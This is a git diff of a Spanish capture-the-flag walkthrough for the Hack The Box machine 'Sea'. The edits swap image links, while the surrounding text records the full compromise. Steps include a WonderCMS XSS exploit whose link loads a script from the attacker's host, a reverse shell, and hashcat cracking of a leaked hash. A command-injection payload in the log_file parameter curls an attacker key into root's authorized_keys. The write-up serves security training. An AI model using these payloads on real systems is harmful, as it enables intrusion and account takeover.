@@ -1,5 +1,6 @@
 
-![[Pasted image 20250512114020.png]]
+![image](https://github.com/user-attachments/assets/5e60069a-314f-4ea3-b6dd-586e28d604ff)
+
 
 
 ## 📝 Descripción
@@ -86,25 +87,26 @@ Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
 
 ### 80 HTTP  (sea.htb)
 
+![image](https://github.com/user-attachments/assets/e12ea990-044b-4a10-977a-568e80b7ade8)
 
-![[Pasted image 20250512120000.png]]
 
+![image](https://github.com/user-attachments/assets/bd9f924a-e874-4569-8850-840c50d28b64)
 
-![[Pasted image 20250512120048.png]]
 ⚠️ **Importante**: Al intentar acceder a la sección de contacto, vemos que la peticición se dirige a un vhost `sea.htb` que deberemos añadir a nuestro fichero /etc/hosts para su resolución:
 
 ```bash
 echo "10.10.11.28 sea.htb" | sudo tee -a /etc/hosts
 ```
 
+![image](https://github.com/user-attachments/assets/3ce7d742-3442-4d94-a087-35e0de217338)
 
-![[Pasted image 20250512120243.png]]
 
 
 
 Activamos el interceptor de Burp y capturamos la petición del formulario:
 
-![[Pasted image 20250512120627.png]]
+![image](https://github.com/user-attachments/assets/f3a54dfc-31ca-4773-ae9d-9db931a77c17)
+
 
 
 Probamos algunas inyecciones XSS sin resultado.
@@ -118,7 +120,8 @@ feroxbuster -u http://sea.htb -r  -w /usr/share/seclists/Discovery/Web-Content/r
 
 Haciendo fuzzing de directorios de forma recursiva con la herramienta ferxobuster encontramos un par de archivos que puede que nos aporten más información sobre algún posible vector de ataque:
 
-![[Pasted image 20250512122508.png]]
+![image](https://github.com/user-attachments/assets/1d56e8a8-f28c-464a-bfc4-1e03430712ff)
+
 
 
 ```
@@ -127,18 +130,22 @@ http://sea.htb/themes/bike/LICENSE
 ```
 
 
-![[Pasted image 20250512122540.png]]
+![image](https://github.com/user-attachments/assets/9d1b0784-febd-4385-bad0-eb105b13872d)
 
-![[Pasted image 20250512122621.png]]
+
+![image](https://github.com/user-attachments/assets/86855e07-78ac-4887-9d31-ff67c27a606c)
+
 
 
 Revisando el código fuente del proyecto en el repositorio oficial de github vemos que también existe un fichero `README.md`
 
-![[Pasted image 20250512125630.png]]
+![image](https://github.com/user-attachments/assets/4e467ac2-c8ce-4931-bb8d-be2dcc6b158b)
+
 
 http://sea.htb/themes/bike/README.md
 
-![[Pasted image 20250512122930.png]]
+![image](https://github.com/user-attachments/assets/8e29dc3f-b694-4fc0-91e7-8067935d6e6d)
+
 
 Este fichero nos aporta información relevante sobre que estamos ante CMS llamado WonderCMS v.3.2.0 a v.3.4.2 permite a un atacante remoto ejecutar código arbitrario a través de un script manipulado y cargado en el componente installModule mediante una vulnerabilidad de Cross Site Scripting.
 
@@ -155,7 +162,8 @@ https://github.com/duck-sec/CVE-2023-41425
 
 Esta exploit abusa de la vulnerabilidad XSS del campo **loginURL** del CMS:
 
- ![[Pasted image 20250512124649.png]]
+![image](https://github.com/user-attachments/assets/1290146e-7146-454e-9625-1aa767dade75)
+
 
 ```bash
 git clone https://github.com/duck-sec/CVE-2023-41425.git
@@ -165,7 +173,8 @@ git clone https://github.com/duck-sec/CVE-2023-41425.git
 python3 exploit.py -u http://sea.htb/loginURL  -lh 10.10.14.6 -lp  7777  -sh 10.10.14.6 -sp 8888
 ```
 
-![[Pasted image 20250512124347.png]]
+![image](https://github.com/user-attachments/assets/a0677958-c905-4023-ab4e-255cc2b03a30)
+
 
 
 El script nos genera la petición que deberemos proporcionar al administrador del sitio para robar su cookie de sesión y realizar la inyección:
@@ -176,15 +185,18 @@ http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.6:8
 
 Para ello nos vamos a servir del campo Website del formulario, el cual generará un hipervínculo y confiaremos en que el administrador que lo reciba haga click en él.
 
-![[Pasted image 20250512131848.png]]
+![image](https://github.com/user-attachments/assets/187a5637-8a3d-4dd0-ae87-40431905d551)
+
 
 En pocos segundos veremos como se realiza la petición al recurso malicioso:
 
-![[Pasted image 20250512132034.png]]
+![image](https://github.com/user-attachments/assets/8749031c-7928-4051-a12d-34792b912337)
+
 
 Y recibimos la reverse shell en nuestro host de ataque:
 
-![[Pasted image 20250512132004.png]]
+![image](https://github.com/user-attachments/assets/4ad69e28-8e4c-43ee-95c1-7b63d96792f2)
+
 
 ### Mejorando la shell
 
@@ -237,8 +249,8 @@ $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
 hashcat -m 3200 hash_bcrypt /usr/share/wordlists/rockyou.txt
 ```
 
+![image](https://github.com/user-attachments/assets/d1a60d50-3e08-4a25-9380-9c9ab396825c)
 
-![[Pasted image 20250512134222.png]]
 
 ```
 mychemicalromance
@@ -249,7 +261,8 @@ Ahora verificamos si está llevando a cabo la mala praxis de reutilización de c
 
 Logramos autenticarnos como amay para obtener la primera flag:
 
-![[Pasted image 20250512134410.png]]
+![image](https://github.com/user-attachments/assets/1e7224af-6a24-4dc2-becf-82e30ab4c823)
+
 
 ```
 amay@sea:~$ cat user.txt
@@ -377,7 +390,8 @@ Enumeramos servicios en ejecución y vemos un servicio ejecutándose en el puert
 ss -tulnp
 ```
 
-![[Pasted image 20250512140255.png]]
+![image](https://github.com/user-attachments/assets/2b696df0-ff87-49ef-bcfe-07f59dd74d09)
+
 
 
 Dado que tenemos la contraseña del usuario amay, podemos verificar si podemos conectarnos vía ssh con estas credenciales y vemos que sí:
@@ -387,7 +401,8 @@ ssh amay@10.10.11.28
 mychemicalromance
 ```
 
-![[Pasted image 20250512140440.png]]
+![image](https://github.com/user-attachments/assets/f5d5f45d-ff9c-4ed8-8a4f-5a650d97d03b)
+
 
 En este punto se me ocurre que podemos realizar port forwading del puerto 8080 a nuestro host de ataque usando para ello el puerto ssh:
 
@@ -398,13 +413,15 @@ ssh -L 8081:127.0.0.1:8080 amay@10.10.11.28
 A continuación desde nuestro host de ataque accedemos a este servicio y encontramos un panel de autenticación HTTP básica. Al probar con las credenciales amay:mychemicalromance logramos acceder:
 
 
-![[Pasted image 20250512142229.png]]
+![image](https://github.com/user-attachments/assets/d0db2fa9-b842-4d80-8d76-ece0b193b814)
+
 
 ## Explotación
 
 No hallamos nada relevante a priori, pero sí que hay un combo que permite seleccionar el archivo del cuál quieres leer el log, vamos a revisar cómo se está realizando la petición interceptándola con Burp Suite y comprobamos que el parámetro log_file no está debidamente sanitizado y que es vulnerable a path traversal:
 
-![[Pasted image 20250512142351.png]]
+![image](https://github.com/user-attachments/assets/d1410eb5-b1ec-4996-bfd8-4258bb4d0890)
+
 
 Sin embargo no podemos leer otros archivos, parece que se está aplicando algún tipo de filtrado. Podemos usar el carácter ; en combinación con # para evadir estos filtros de la siguiente forma:
 
@@ -412,7 +429,8 @@ Sin embargo no podemos leer otros archivos, parece que se está aplicando algún
 log_file=/etc/passwd;whoami #&analyze_log=
 ```
 
-![[Pasted image 20250512151401.png]]
+![image](https://github.com/user-attachments/assets/5a421240-ed8a-4422-a085-b150eb79f723)
+
 
 De esta forma vemos que además de listar el contenido del fichero /etc/passwd también se ejecuta el comando whoami.
 
@@ -433,10 +451,11 @@ Iniciamos el listener y a continuación lanzamos la petición:
 ```bash
 nc -nlvp 4444
 ```
+![image](https://github.com/user-attachments/assets/dc21b405-d530-4670-b9e0-ee5c993ff391)
 
-![[Pasted image 20250512153512.png]]
 
-![[Pasted image 20250512153531.png]]
+![image](https://github.com/user-attachments/assets/c20e1dc5-6e71-4321-b4a6-d8b0538a480a)
+
 
 ### Opción alternativa, sin usar reverse shell
 
@@ -459,7 +478,8 @@ log_file=/etc/passwd; curl 10.10.14.6/id_rsa.pub -o /root/.ssh/authorized_keys #
 ```
 
 
-![[Pasted image 20250512154620.png]]
+![image](https://github.com/user-attachments/assets/5f730277-bae2-40bb-b31f-b9f25f6af9e7)
+
 
 Si todo ha ido bien, deberíamos poder conectarnos como root al host víctima sin indicar contraseña:
 
@@ -467,4 +487,4 @@ Si todo ha ido bien, deberíamos poder conectarnos como root al host víctima si
 ssh root@10.10.11.28
 ```
 
-![[Pasted image 20250512155317.png]]
+![image](https://github.com/user-attachments/assets/747ab895-dc68-43e8-85b4-e6f5c9ee2c0e)
